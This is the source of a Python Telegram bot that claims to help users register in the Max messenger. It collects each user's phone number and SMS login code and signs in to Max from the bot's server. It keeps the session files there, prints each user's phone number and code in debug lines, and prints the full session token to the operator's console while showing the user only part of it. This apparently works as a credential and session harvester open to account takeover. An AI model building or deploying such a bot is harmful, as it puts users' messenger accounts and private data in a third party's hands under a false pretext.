import asyncio
import os
import shutil
import traceback
from typing import Dict

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from dotenv import load_dotenv

from pymax import SocketMaxClient
from pymax.payloads import UserAgentPayload

# ========== ЗАГРУЗКА ПЕРЕМЕННЫХ ==========
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN не найден в .env файле")

# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ========== СОСТОЯНИЯ ==========
class RegStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ========== ВРЕМЕННОЕ ХРАНИЛИЩЕ ==========
temp_sessions: Dict[int, dict] = {}

# ========== ОЧИСТКА ПОВРЕЖДЁННОЙ БАЗЫ ==========
def cleanup_corrupted_session(user_id: int):
    """Удаляет повреждённую папку с сессией"""
    work_dir = f"cache_{user_id}"
    if os.path.exists(work_dir):
        try:
            shutil.rmtree(work_dir)
            print(f"[DEBUG] Удалена повреждённая папка: {work_dir}")
        except Exception as e:
            print(f"[DEBUG] Не удалось удалить {work_dir}: {e}")

# ========== КОМАНДА /START ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    print(f"[DEBUG] /start от пользователя {user_id}")
    
    # Очищаем старую сессию, если была
    if user_id in temp_sessions:
        del temp_sessions[user_id]
    cleanup_corrupted_session(user_id)
    
    await message.answer(
        "👋 Привет! Я помогу зарегистрироваться в Max.\n\n"
        "Введите ваш номер телефона в формате:\n"
        "`+79123456789`",
        parse_mode="Markdown"
    )
    await state.set_state(RegStates.waiting_phone)

# ========== ОБРАБОТКА НОМЕРА ==========
@dp.message(RegStates.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_id = message.from_user.id
    
    print(f"[DEBUG] Пользователь {user_id} ввёл номер: {phone}")
    
    # Проверка формата
    if not phone.startswith("+") or not phone[1:].isdigit():
        await message.answer("❌ Неверный формат. Пример: `+79123456789`", parse_mode="Markdown")
        return
    
    await message.answer(f"📱 Отправляю запрос на номер {phone}...")
    
    # Очищаем старую сессию перед новой
    cleanup_corrupted_session(user_id)
    work_dir = f"cache_{user_id}"
    
    try:
        # Создаём клиент
        ua = UserAgentPayload(device_type="DESKTOP", app_version="25.12.13")
        client = SocketMaxClient(
            phone=phone,
            work_dir=work_dir,
            headers=ua
        )
        
        # Создаём события для синхронизации
        code_received = asyncio.Event()
        auth_completed = asyncio.Event()
        auth_success = False
        auth_token = None
        auth_error = None
        
        # Флаг, что код уже запрошен
        code_requested = False
        
        # Подписываемся на запрос кода (если есть такой метод)
        if hasattr(client, 'on_code_request'):
            @client.on_code_request
            async def on_code_request():
                nonlocal code_requested
                if not code_requested:
                    code_requested = True
                    await message.answer("📲 Код отправлен! Введите код из SMS:")
                    await state.set_state(RegStates.waiting_code)
                await code_received.wait()
                return temp_sessions.get(user_id, {}).get("code")
        
        # Запускаем авторизацию в отдельной задаче
        async def auth_task():
            nonlocal auth_success, auth_token, auth_error
            try:
                await client.start()
                auth_success = client.is_authorized
                if auth_success and hasattr(client, 'me') and client.me:
                    auth_token = client.me.token if hasattr(client.me, 'token') else str(client.me)
                auth_completed.set()
            except Exception as e:
                auth_error = e
                auth_completed.set()
        
        # Сохраняем данные
        temp_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "code_received": code_received,
            "auth_completed": auth_completed,
            "code": None
        }
        
        # Запускаем задачу авторизации
        asyncio.create_task(auth_task())
        
        # Ждём запрос кода или завершение с ошибкой
        try:
            await asyncio.wait_for(auth_completed.wait(), timeout=30)
        except asyncio.TimeoutError:
            # Если не завершилось, возможно ждёт код
            pass
        
        # Проверяем, не было ли ошибки
        if auth_error:
            error_msg = str(auth_error).lower()
            
            # Проверяем, не зарегистрирован ли уже номер
            if "already registered" in error_msg or "already exists" in error_msg or "phone already" in error_msg:
                await message.answer(
                    "❌ **Этот номер уже зарегистрирован в Max!**\n\n"
                    "Используйте другой номер или войдите в существующий аккаунт.",
                    parse_mode="Markdown"
                )
            elif "invalid phone" in error_msg or "wrong format" in error_msg:
                await message.answer(
                    "❌ **Неверный формат номера!**\n\n"
                    "Введите номер в формате `+79123456789`",
                    parse_mode="Markdown"
                )
            else:
                await message.answer(
                    f"❌ Ошибка при отправке кода:\n`{auth_error}`\n\nПопробуйте позже.",
                    parse_mode="Markdown"
                )
            
            # Очищаем сессию
            del temp_sessions[user_id]
            cleanup_corrupted_session(user_id)
            await state.clear()
            return
        
        # Если всё ок, ждём код
        await message.answer("📲 Код отправлен! Введите код из SMS:")
        await state.set_state(RegStates.waiting_code)
        
    except Exception as e:
        error_msg = str(e).lower()
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        
        # Обработка ошибки SQLite
        if "sqlite" in error_msg or "unsupported file format" in error_msg:
            cleanup_corrupted_session(user_id)
            await message.answer(
                "❌ Ошибка базы данных сессии. Папка кэша очищена.\n"
                "Пожалуйста, начните заново с /start"
            )
        else:
            await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")
        
        if user_id in temp_sessions:
            del temp_sessions[user_id]
        await state.clear()

# ========== ОБРАБОТКА КОДА ==========
@dp.message(RegStates.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    user_id = message.from_user.id
    
    print(f"[DEBUG] Пользователь {user_id} ввёл код: {code}")
    
    # Проверяем сессию
    if user_id not in temp_sessions:
        await message.answer("❌ Сессия истекла. Начните заново с /start")
        await state.clear()
        return
    
    session = temp_sessions[user_id]
    client = session["client"]
    phone = session["phone"]
    code_received = session.get("code_received")
    auth_completed = session.get("auth_completed")
    
    # Передаём код
    session["code"] = code
    if code_received:
        code_received.set()
    
    await message.answer("🔐 Проверяю код...")
    
    try:
        # Ждём завершения авторизации (максимум 30 секунд)
        if auth_completed:
            try:
                await asyncio.wait_for(auth_completed.wait(), timeout=30)
            except asyncio.TimeoutError:
                await message.answer("❌ Превышено время ожидания. Попробуйте снова /start")
                del temp_sessions[user_id]
                await state.clear()
                return
        
        # Проверяем результат
        if client.is_authorized:
            token = None
            if hasattr(client, 'me') and client.me:
                token = client.me.token if hasattr(client.me, 'token') else str(client.me)
            
            if token:
                await message.answer(
                    f"✅ **Регистрация в Max успешна!**\n\n"
                    f"📱 Номер: `{phone}`\n"
                    f"🔑 Токен: `{token[:30]}...`\n\n"
                    f"⚠️ Сохраните токен для будущих входов.",
                    parse_mode="Markdown"
                )
                print(f"\n{'='*50}")
                print(f"✅ НОВЫЙ ПОЛЬЗОВАТЕЛЬ")
                print(f"📱 Номер: {phone}")
                print(f"🔑 Токен: {token}")
                print(f"{'='*50}\n")
            else:
                await message.answer(
                    f"✅ **Авторизация успешна!**\n\n"
                    f"📱 Номер: `{phone}`\n"
                    f"Токен сохранён в сессии.",
                    parse_mode="Markdown"
                )
        else:
            # Если не авторизован — код неверный
            await message.answer(
                "❌ **Неверный код!**\n\n"
                "Попробуйте ещё раз. Если код не пришёл, запросите новый через /start",
                parse_mode="Markdown"
            )
            # Оставляем сессию, даём попробовать снова
            session["code"] = None
            if code_received:
                # Сбрасываем событие для нового кода
                code_received.clear()
            await state.set_state(RegStates.waiting_code)
            return
        
        # Очищаем сессию
        del temp_sessions[user_id]
        await state.clear()
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        
        error_msg = str(e).lower()
        if "invalid" in error_msg or "wrong" in error_msg or "code" in error_msg:
            await message.answer(
                "❌ **Неверный код!**\n\n"
                "Попробуйте ещё раз. Если код не пришёл, запросите новый через /start",
                parse_mode="Markdown"
            )
            session["code"] = None
            if code_received:
                code_received.clear()
            await state.set_state(RegStates.waiting_code)
        else:
            await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")
            del temp_sessions[user_id]
            await state.clear()

# ========== ЗАПУСК ==========
async def main():
    print("=" * 50)
    print("🚀 Бот запущен")
    print("=" * 50)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
